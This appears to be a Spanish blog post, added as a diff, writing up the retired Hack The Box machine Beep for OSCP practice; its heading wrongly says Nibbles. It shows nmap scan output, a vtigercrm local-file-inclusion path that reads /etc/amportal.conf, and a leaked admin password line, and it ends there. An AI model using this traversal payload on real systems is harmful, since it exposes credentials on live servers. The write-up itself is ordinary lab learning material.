@@ -1,0 +1,70 @@
+---
+layout: post
+title:  "OSCP Path ~ Beep de Hack The Box (Necesario VIP)"
+description: Writeup de la maquina de HackTheBox llamada BEEP siguiendo el PATH para el OSCP
+tags: HTB, OSCP Path, LFI, Python, Elastix, Maquinas Retiradas, Writeup, Hacking
+---
+
+# Nibbles ~ Hack The Box to OSCP
+
+Realizamos el Primer escaneo con Nmap
+```bash
+$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.7       "
+``` 
+
+Procedemos con el siguiente escaneo de Nmap
+```bash
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+25/tcp    open  smtp       Postfix smtpd
+|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+80/tcp    open  http       Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.10.10.7/
+110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_pop3-capabilities: LOGIN-DELAY(0) EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) STLS RESP-CODES USER AUTH-RESP-CODE PIPELINING TOP UIDL APOP
+111/tcp   open  rpcbind    2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            876/udp   status
+|_  100024  1            879/tcp   status
+143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_imap-capabilities: UIDPLUS MAILBOX-REFERRALS ANNOTATEMORE LITERAL+ RENAME OK ATOMIC MULTIAPPEND URLAUTHA0001 X-NETSCAPE BINARY IMAP4 SORT LISTEXT IDLE NAMESPACE Completed ID CATENATE ACL CONDSTORE IMAP4rev1 QUOTA THREAD=REFERENCES SORT=MODSEQ LIST-SUBSCRIBED NO STARTTLS RIGHTS=kxte CHILDREN UNSELECT THREAD=ORDEREDSUBJECT
+443/tcp   open  ssl/https?
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2017-04-07T08:22:08
+|_Not valid after:  2018-04-07T08:22:08
+|_ssl-date: 2021-05-07T21:07:39+00:00; -2s from scanner time.
+879/tcp   open  status     1 (RPC #100024)
+993/tcp   open  ssl/imap   Cyrus imapd
+|_imap-capabilities: CAPABILITY
+995/tcp   open  pop3       Cyrus pop3d
+3306/tcp  open  mysql      MySQL (unauthorized)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
+4445/tcp  open  upnotifyp?
+4559/tcp  open  hylafax    HylaFAX 4.3.10
+5038/tcp  open  asterisk   Asterisk Call Manager 1.1
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+
+Host script results:
+|_clock-skew: -2s
+```
+Buscamos por el puerto 80 o http y encontramos un loguin de ELASTIX
+Buscamos en searchsploit y encontramos cosillas como un LFI
+`"/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action"`
+
+
+
+ARI_ADMIN_PASSWORD=jEhdIekWmdjE# AUTHTYPE=database|none# Authentication type to use for web admininstration.
